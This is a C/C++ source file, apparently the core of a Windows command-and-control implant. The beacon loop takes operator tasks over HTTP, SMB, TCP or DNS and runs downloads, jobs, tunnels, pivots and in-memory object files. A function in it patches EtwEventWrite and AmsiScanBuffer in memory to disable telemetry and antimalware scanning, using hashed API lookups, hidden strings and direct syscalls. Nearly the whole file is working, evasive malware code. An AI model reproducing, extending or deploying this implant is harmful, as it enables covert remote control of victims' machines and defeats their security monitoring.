#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"
#include "Boffer.h"
#include "Connector.h"
#include "Syscalls.h"

#if defined(BEACON_HTTP)
#include "ConnectorHTTP.h"
#elif defined(BEACON_SMB)
#include "ConnectorSMB.h"
#elif defined(BEACON_TCP)
#include "ConnectorTCP.h"
#elif defined(BEACON_DNS)
#include "ConnectorDNS.h"
#endif

Agent* g_Agent;
Connector* g_Connector;

static Connector* CreateConnector()
{
#if defined(BEACON_HTTP)
	return new ConnectorHTTP();
#elif defined(BEACON_SMB)
	return new ConnectorSMB();
#elif defined(BEACON_TCP)
	return new ConnectorTCP();
#elif defined(BEACON_DNS)
	return new ConnectorDNS();
#endif
}

static void PatchEtwAmsi()
{
	HMODULE hNtdll = GetModuleAddress(HASH_LIB_NTDLL);
	if (hNtdll) {
		PVOID pEtwEventWrite = GetSymbolAddress(hNtdll, 0x65b4a1c9);
		if (pEtwEventWrite) {
			PVOID pBase = pEtwEventWrite;
			SIZE_T sz = 1;
			ULONG oldProt;
			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_READWRITE, &oldProt);
			*(BYTE*)pEtwEventWrite = 0xC3;
			pBase = pEtwEventWrite;
			sz = 1;
			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, oldProt, &oldProt);
		}
	}

	CHAR amsi_c[13];
	amsi_c[0]  = HdChrA('a');
	amsi_c[1]  = HdChrA('m');
	amsi_c[2]  = HdChrA('s');
	amsi_c[3]  = HdChrA('i');
	amsi_c[4]  = HdChrA('.');
	amsi_c[5]  = HdChrA('d');
	amsi_c[6]  = HdChrA('l');
	amsi_c[7]  = HdChrA('l');
	amsi_c[8]  = 0;

	HMODULE hAmsi = ApiWin->LoadLibraryA(amsi_c);
	if (hAmsi) {
		PVOID pAmsiScanBuffer = GetSymbolAddress(hAmsi, 0x6aede52b);
		if (pAmsiScanBuffer) {
			PVOID pBase = pAmsiScanBuffer;
			SIZE_T sz = 8;
			ULONG oldProt;
			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_READWRITE, &oldProt);
#ifdef _WIN64
			*(BYTE*)pAmsiScanBuffer = 0xB8;
			*(DWORD*)((BYTE*)pAmsiScanBuffer + 1) = 1;
			*(WORD*)((BYTE*)pAmsiScanBuffer + 5) = 0xC30F;
#else
			*(BYTE*)pAmsiScanBuffer = 0xB8;
			*(DWORD*)((BYTE*)pAmsiScanBuffer + 1) = 1;
			*(WORD*)((BYTE*)pAmsiScanBuffer + 5) = 0xC20F;
#endif
			pBase = pAmsiScanBuffer;
			sz = 8;
			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, oldProt, &oldProt);
		}
	}
}

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	if (!ApiLoad())
		return 0;

	InitSyscalls();
	PatchEtwAmsi();

	g_Agent = new Agent();
	g_Connector = CreateConnector();

	g_AsyncBofManager = new Boffer();
	g_AsyncBofManager->Initialize();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if (!g_Connector->SetProfile(&g_Agent->config->profile, beat, beatSize))
		return 0;

	MemFreeLocal((LPVOID*)&beat, beatSize);

	Packer* packerOut = new Packer();
	packerOut->Pack32(0);

	ULONG initDelay = GenerateRandom32() % (g_Agent->config->sleep_delay * 1000);
	if (initDelay > 0)
		mySleep(initDelay);

	do {
		if (!g_Connector->WaitForConnection())
			continue;

		do {
			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());
				g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->Exchange(nullptr, 0, g_Agent->SessionKey);
			}

			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData())
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
			g_Connector->RecvClear();

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);
			g_AsyncBofManager->ProcessAsyncBofs(packerOut);

			if (g_Agent->IsActive()) {
				const BOOL hasOutput = (packerOut->datasize() >= 8);
				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
			}

		} while (g_Connector->IsConnected() && g_Agent->IsActive());

		if (!g_Agent->IsActive() && g_Connector->IsConnected()) {
			g_Agent->commander->Exit(packerOut);
			packerOut->Set32(0, packerOut->datasize());
			g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
			g_Connector->RecvClear();
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	packerOut->Clear(FALSE);
	delete packerOut;

	g_Connector->CloseConnector();
	AgentExit(g_Agent->config->exit_method);
	return 0;
}

void AgentExit(const int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
